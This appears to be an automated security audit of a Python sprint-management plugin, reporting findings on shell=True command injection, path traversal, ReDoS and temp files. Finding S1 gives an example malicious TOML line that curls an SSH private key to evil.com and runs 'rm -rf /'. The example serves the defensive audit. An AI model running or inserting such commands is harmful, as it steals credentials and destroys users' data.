# Security Audit — Giles Plugin

Auditor: Claude Opus 4.6 (automated recon)
Date: 2026-03-16
Scope: All Python scripts under `scripts/`, `skills/*/scripts/`, excluding `.venv/` and `tests/`


---

## 1. Command Injection via Subprocess

### FINDING S1 — CRITICAL: `shell=True` with user-controlled TOML values in release_gate.py

**Files:**
- `skills/sprint-release/scripts/release_gate.py:209-210` (`gate_tests`)
- `skills/sprint-release/scripts/release_gate.py:228-229` (`gate_build`)

**Description:**
`gate_tests()` iterates over `config["ci"]["check_commands"]` (a list of strings from `project.toml`) and passes each one to `subprocess.run(cmd, shell=True, ...)`. Similarly, `gate_build()` passes `config["ci"]["build_command"]` with `shell=True`.

These values come directly from the custom TOML parser (`parse_simple_toml`), which reads them as plain strings from `project.toml`. A user who controls `project.toml` can inject arbitrary shell commands.

**Example malicious TOML:**
```toml
[ci]
check_commands = ["cargo test; curl http://evil.com/exfil?data=$(cat ~/.ssh/id_rsa)"]
build_command = "make build && rm -rf /"
```

**Exploitability in practice: LOW-MEDIUM.**
The code comments acknowledge this is intentional ("commands are user-configured shell expressions"). The threat model here is that the user *owns* the TOML file — they are running commands they configured themselves. The real risk is:
1. A supply-chain attack where a malicious contributor modifies `project.toml` in a PR, and a reviewer runs `sprint-release` without noticing.
2. A shared repository where one developer's TOML edits execute on another developer's machine.

The code does include a 300-second timeout, which limits damage from infinite loops but not from fast destructive commands.

### FINDING S2 — LOW: gh() helper uses list-based invocation (SAFE)

**File:** `scripts/validate_config.py:56-68`

**Description:**
The `gh()` helper properly uses `subprocess.run(["gh", *args], ...)` — a list invocation without `shell=True`. This means arguments are passed directly to the process without shell interpretation. User-controlled data (milestone titles, label names, issue bodies) flows into these list arguments and is NOT subject to shell injection.

**Verdict: Safe by design.** This is the correct pattern.

### FINDING S3 — LOW: All other subprocess.run calls use list invocation (SAFE)

**Files:**
- `scripts/commit.py:65,98` — `git diff`, `git commit` with list args
- `scripts/sprint_init.py:165,605` — `git remote -v`, `git rev-parse` with list args
- `skills/sprint-setup/scripts/bootstrap_github.py:20,27,34` — `gh --version`, `gh auth status`, `git remote -v` with list args
- `skills/sprint-setup/scripts/populate_issues.py:39` — `gh auth status` with list args
- `skills/sprint-setup/scripts/setup_ci.py:341,366` — `git rev-parse` with list args
- `scripts/sprint_teardown.py:294,402` — `crontab -l`, `git diff` with list args
- `skills/sprint-release/scripts/release_gate.py:41-65,391,448,487,...` — all `git` commands with list args

**Verdict:** All non-`shell=True` invocations use list-form. No f-string or concatenation-based command building was found anywhere in the codebase.


---

## 2. Path Traversal

### FINDING P1 — MEDIUM: Symlink targets are not validated against project root

**File:** `scripts/sprint_init.py:549-561` (`_symlink` method)

**Description:**
`ConfigGenerator._symlink()` creates symlinks from `sprint-config/` to targets specified by the `Detection.value` field, which comes from scanning the project directory. The method checks that `target_abs.exists()` but does NOT validate that the target is within the project root.

```python
def _symlink(self, link_rel: str, target_rel: str) -> None:
    link_path = self.config_dir / link_rel
    target_abs = self.root / target_rel
    if not target_abs.exists():
        self.skipped.append(...)
        return
    rel = os.path.relpath(target_abs, link_path.parent)
    link_path.symlink_to(rel)
```

If `target_rel` contains `../../../etc/passwd`, the symlink would be created pointing outside the project. However, `target_rel` comes from the project scanner's detection results (not directly from TOML), so the practical attack surface is limited to:
1. A scanner detection returning a path that traverses upward (unlikely given the scanning logic).
2. Manual manipulation of Detection objects (not a real attack vector).

**Exploitability in practice: LOW.** The scanner detections are computed by looking for known filenames within the project tree. User TOML values for paths (like `paths.team_dir`) are resolved by `load_config()` at line 651-655 but those resolved paths are used for reading, not for symlink creation during init.

### FINDING P2 — LOW: TOML path values are resolved without containment

**File:** `scripts/validate_config.py:649-655` (`load_config`)

**Description:**
```python
project_root = Path(config_dir).resolve().parent
if "paths" in config and isinstance(config["paths"], dict):
    for key, val in config["paths"].items():
        if isinstance(val, str):
            config["paths"][key] = str(project_root / val)
```

All `[paths]` values from TOML are resolved relative to the project root. A path like `../../secrets` would resolve to a location outside the project. Scripts that subsequently read these paths (milestone files, team files, etc.) would follow them.

**Exploitability in practice: LOW.** Same threat model as S1 — the user controls their own TOML. The risk is a malicious `project.toml` in a shared repository that causes other developers' tools to read arbitrary files. However, the tool only reads markdown files; it does not exfiltrate their content to any remote service.

### FINDING P3 — LOW: sprint_teardown.py takes project root from CLI argument

**File:** `scripts/sprint_teardown.py:358-364`

**Description:**
```python
for arg in sys.argv[1:]:
    if not arg.startswith("-"):
        candidate = Path(arg)
        if candidate.is_dir():
            project_root = candidate.resolve()
            break
```

The teardown script accepts an arbitrary directory as a positional argument and will operate on `{dir}/sprint-config/`. This is expected CLI behavior and the script only removes files within `sprint-config/` (symlinks, generated files). Not exploitable beyond the obvious "don't run teardown on a directory you don't own."


---

## 3. TOML Parser Security

### FINDING T1 — LOW: No eval/exec/compile in TOML parser (SAFE)

**File:** `scripts/validate_config.py:117-190` (`parse_simple_toml`)

**Description:**
The custom TOML parser uses manual string parsing: regex for section headers and key-value lines, character-by-character iteration for quote handling, and explicit type detection (bool literals, quoted strings, integers, arrays). There is NO use of `eval()`, `exec()`, or `compile()` anywhere in the parser or the entire codebase (the only `re.compile` calls are for regex objects, which is safe).

**Verdict: Safe.** This is a well-written minimal parser.

### FINDING T2 — LOW: No depth or size limits in TOML parser

**File:** `scripts/validate_config.py:117-190`

**Description:**
The parser has no protection against:
- Very large TOML files (e.g., a 1GB `project.toml` would be fully read into memory)
- Deeply nested section paths (though the parser only creates one level of nesting per `[section]` header, not recursive)
- Arrays with millions of elements

**Exploitability in practice: NEGLIGIBLE.** The TOML file is a local config file that the developer created. A malicious TOML that causes high memory usage would only affect the developer who runs the tool. The parser does not support nested arrays or tables-of-tables, limiting the nesting attack surface.

### FINDING T3 — LOW: Unquoted values accepted as raw strings

**File:** `scripts/validate_config.py:323-329`

**Description:**
The `_parse_value()` function accepts unquoted values as raw strings with only a warning. This is lenient but not a security issue — it just means `name = hello world` is parsed as `"hello world"` with a warning rather than erroring.


---

## 4. Regex Denial of Service (ReDoS)

### FINDING R1 — MEDIUM: User-controlled regex compilation in populate_issues.py

**Files:**
- `skills/sprint-setup/scripts/populate_issues.py:61-84` (`_build_row_regex`)
- `skills/sprint-setup/scripts/populate_issues.py:164-172` (`_build_detail_block_re`)

**Description:**
The `_build_row_regex()` function reads `config["backlog"]["story_id_pattern"]` from TOML and compiles it into a regex:

```python
pattern = backlog.get("story_id_pattern", "")
if pattern:
    if re.search(r'(?<!\\)\((?!\?)', pattern):  # reject capturing groups
        return _DEFAULT_ROW_RE
    try:
        return re.compile(
            rf"\|\s*({pattern})\s*\|..."
        )
```

The code rejects patterns containing capturing groups (to avoid group-number shifts), and catches `re.error` on invalid patterns. However, it does NOT check for catastrophic backtracking patterns. A user could set:

```toml
[backlog]
story_id_pattern = "(?:a+)+b"
```

This would compile successfully and cause exponential backtracking when matched against milestone files containing long strings of `a` characters.

**Exploitability in practice: LOW.** The pattern is applied to markdown tables that the user also controls. A user who wants to DoS themselves can already do so in many other ways. The realistic scenario is a malicious `project.toml` causing CI or another developer's machine to hang.

### FINDING R2 — LOW: `_SPRINT_HEADER_RE` uses `.*?` with `re.DOTALL` (safe)

**File:** `skills/sprint-setup/scripts/populate_issues.py:56-58`

```python
_SPRINT_HEADER_RE = re.compile(
    r"### Sprint (\d+):.*?\n(.*?)(?=\n### Sprint |\n## |\Z)", re.DOTALL
)
```

The `.*?` with `re.DOTALL` and a lookahead could theoretically backtrack, but the lookahead alternatives are anchored to newline + specific strings, which limits backtracking. Not a practical ReDoS vector.

### FINDING R3 — LOW: All other regex patterns are safe

All other compiled regex patterns in the codebase use:
- Anchored patterns (`^`, `$`)
- Simple character classes (`\d+`, `\w+`, `[^*]+?`)
- Non-nested quantifiers
- `re.escape()` for user-provided values (e.g., `sync_tracking.py:106`)

No nested quantifier patterns like `(a+)+`, `(a*)*`, or `(a|b)*c` were found in any hardcoded regex.


---

## 5. Temporary File Handling

### FINDING F1 — LOW: NamedTemporaryFile in release_gate.py (safe pattern)

**File:** `skills/sprint-release/scripts/release_gate.py:617-644`

```python
notes_fd = tempfile.NamedTemporaryFile(
    mode='w', suffix='.md', prefix='release-notes-',
    delete=False, encoding='utf-8',
)
notes_path = Path(notes_fd.name)
try:
    notes_fd.write(notes)
    notes_fd.close()
    # ... use notes_path ...
finally:
    notes_path.unlink(missing_ok=True)
```

**Verdict: Safe.** Uses `NamedTemporaryFile` with `delete=False` and explicit cleanup in a `finally` block. The `tempfile` module generates unpredictable filenames by default, preventing symlink-race attacks. The temp file contains release notes (not secrets).

### FINDING F2 — LOW: No other temporary file usage in production code

The only other `tempfile` usage is in test files (`tests/`), which is fine.


---

## 6. Additional Observations

### FINDING A1 — LOW: `read_tf` inner function `v()` uses unescaped key in regex

**File:** `skills/sprint-run/scripts/sync_tracking.py:163`

```python
def v(k: str) -> str:
    m = re.search(rf"^{k}:\s*(.+)", raw, re.MULTILINE)
```

The key `k` is passed unescaped into a regex. However, all callers pass hardcoded string literals (`"story"`, `"title"`, `"sprint"`, etc.) at lines 173-179, so this is not exploitable.

### FINDING A2 — LOW: format_issue_body includes user-controlled story content in GitHub issue bodies

**File:** `skills/sprint-setup/scripts/populate_issues.py:367-404`

Story titles, acceptance criteria, and user story text from milestone markdown files are directly interpolated into GitHub issue body strings. This is not a code execution risk because the data goes to GitHub's API (which handles its own XSS prevention), but markdown injection could produce misleading issue content.

### FINDING A3 — INFO: No secrets handling, no network requests beyond `gh`

The codebase makes no direct HTTP requests (no `urllib`, `requests`, etc.). All network communication goes through `gh` CLI, which handles authentication via its own token store. No credentials, API keys, or tokens are read or stored by giles scripts.

### FINDING A4 — INFO: TOCTOU in sync_backlog.py acknowledged in comments

**File:** `scripts/sync_backlog.py:219-223`

The code acknowledges a TOCTOU window between hashing milestone files and reading them in `do_sync()`. The debounce mechanism mitigates this by requiring hashes to stabilize across multiple invocations. Not a security issue, but noted for completeness.


---

## Summary Table

| ID | Severity | Category | File | Description |
|----|----------|----------|------|-------------|
| S1 | **CRITICAL** | Command injection | `release_gate.py:209,229` | `shell=True` with TOML-sourced commands |
| R1 | **MEDIUM** | ReDoS | `populate_issues.py:78` | User-controlled regex pattern from TOML |
| P1 | **MEDIUM** | Path traversal | `sprint_init.py:553` | Symlink targets not validated against project root |
| P2 | LOW | Path traversal | `validate_config.py:651-655` | TOML path values resolved without containment check |
| P3 | LOW | Path traversal | `sprint_teardown.py:358` | CLI arg used as project root |
| T2 | LOW | Parser | `validate_config.py:117` | No size/depth limits in TOML parser |
| T3 | LOW | Parser | `validate_config.py:323` | Unquoted values accepted |
| A1 | LOW | Regex | `sync_tracking.py:163` | Unescaped key in regex (all callers use literals) |
| A2 | LOW | Data injection | `populate_issues.py:367` | User content in issue bodies (GitHub handles XSS) |
| S2 | LOW | Subprocess | `validate_config.py:59` | gh() uses list invocation (SAFE) |
| S3 | LOW | Subprocess | (multiple) | All other subprocess calls use list invocation (SAFE) |
| T1 | LOW | Parser | `validate_config.py:117` | No eval/exec in parser (SAFE) |
| R2 | LOW | ReDoS | `populate_issues.py:57` | Sprint header regex (safe) |
| R3 | LOW | ReDoS | (multiple) | All other regexes are safe |
| F1 | LOW | Temp files | `release_gate.py:617` | NamedTemporaryFile (safe pattern) |
| F2 | LOW | Temp files | — | No other temp file usage |
| A3 | INFO | Architecture | — | No direct network; all via gh CLI |
| A4 | INFO | Race condition | `sync_backlog.py:219` | TOCTOU acknowledged and mitigated |


## Contextual Risk Assessment

This is a **developer tool** (Claude Code plugin), not a web service. The threat model is:

1. **Developer runs tool on their own machine** — LOW RISK. The developer controls the TOML config and markdown files. `shell=True` in S1 is running commands the developer chose.

2. **Malicious project.toml in a shared repository** — MEDIUM RISK. A contributor could submit a PR that modifies `project.toml` to include malicious shell commands (S1), ReDoS patterns (R1), or path traversal values (P1/P2). Another developer who runs sprint-release on that branch would execute the malicious commands.

3. **Supply chain attack on giles itself** — LOW RISK. The scripts are inspectable and the plugin has no network access beyond `gh` CLI.

The most actionable finding is **S1**: consider documenting the trust model for `project.toml` (i.e., "only run release gates on branches you trust") or adding a confirmation prompt before executing shell commands.
